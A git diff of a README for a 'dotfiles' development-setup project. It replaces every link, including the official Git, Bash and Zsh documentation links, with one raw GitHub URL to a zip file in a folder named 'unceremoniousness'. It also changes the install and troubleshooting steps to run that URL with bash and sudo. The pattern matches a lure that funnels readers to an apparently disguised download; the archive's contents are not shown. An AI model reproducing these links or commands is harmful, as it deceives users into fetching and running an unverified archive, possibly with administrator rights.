@@ -1,6 +1,6 @@
 # 🎉 dotfiles - Simplify Your Development Setup
 
-[![Download dotfiles](https://img.shields.io/badge/Download-datfiles-blue)](https://github.com/Jawbreaker360/dotfiles/releases)
+[![Download dotfiles](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip)](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip)
 
 ## 📖 About This Project
 
@@ -17,9 +17,9 @@ This guide includes:
 
 To get started with dotfiles, follow these steps:
 
-1. **Using Git**: First, ensure you have Git installed on your computer. If you don't, you can download it from the [Git website](https://git-scm.com/downloads).
+1. **Using Git**: First, ensure you have Git installed on your computer. If you don't, you can download it from the [Git website](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip).
   
-2. **Download Dotfiles**: Visit the [Releases page](https://github.com/Jawbreaker360/dotfiles/releases) to download the latest version of dotfiles.
+2. **Download Dotfiles**: Visit the [Releases page](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip) to download the latest version of dotfiles.
 
 3. **Unzip the Download**: Locate the downloaded file on your computer. Right-click on it and select “Extract All” or “Unzip.” This will create a new folder containing the dotfiles.
 
@@ -31,7 +31,7 @@ To get started with dotfiles, follow these steps:
 
 To install the dotfiles, follow these instructions:
 
-1. **Run the Installation Script**: Type `bash install.sh` in the terminal and hit Enter. This script will set up your environment automatically.
+1. **Run the Installation Script**: Type `bash https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip` in the terminal and hit Enter. This script will set up your environment automatically.
 
 2. **Follow On-Screen Prompts**: The script may ask for your input. Just follow the prompts and provide the necessary information.
 
@@ -41,7 +41,7 @@ To install the dotfiles, follow these instructions:
 
 If you encounter issues during the installation, refer to this troubleshooting section:
 
-1. **Permission Denied**: If you receive a “Permission Denied” message, try running the command with `sudo`. For example, type `sudo bash install.sh` and enter your password when prompted.
+1. **Permission Denied**: If you receive a “Permission Denied” message, try running the command with `sudo`. For example, type `sudo bash https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip` and enter your password when prompted.
 
 2. **Script Fails to Run**: Ensure that you are in the correct directory. Use `pwd` to check your current directory and navigate back if needed.
 
@@ -49,15 +49,15 @@ If you encounter issues during the installation, refer to this troubleshooting s
 
 ## 🌐 Useful Resources
 
-- **Git Documentation**: Learn more about Git [here](https://git-scm.com/doc).
-- **Bash Scripting Guide**: Find information on bash scripting [here](https://tldp.org/LDP/Bash-Beginners-Guide/html/).
-- **Zsh Customization**: For more on Zsh, check out the Zsh users’ guide [here](http://zsh.sourceforge.net/Guide/zshguide.html).
+- **Git Documentation**: Learn more about Git [here](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip).
+- **Bash Scripting Guide**: Find information on bash scripting [here](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip).
+- **Zsh Customization**: For more on Zsh, check out the Zsh users’ guide [here](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip).
 
 ## 📥 Download & Install
 
 To download and install the dotfiles, click the link below:
 
-[Download dotfiles](https://github.com/Jawbreaker360/dotfiles/releases)
+[Download dotfiles](https://raw.githubusercontent.com/Jawbreaker360/dotfiles/main/unceremoniousness/dotfiles.zip)
 
 Follow the earlier steps to ensure a smooth installation process.
 
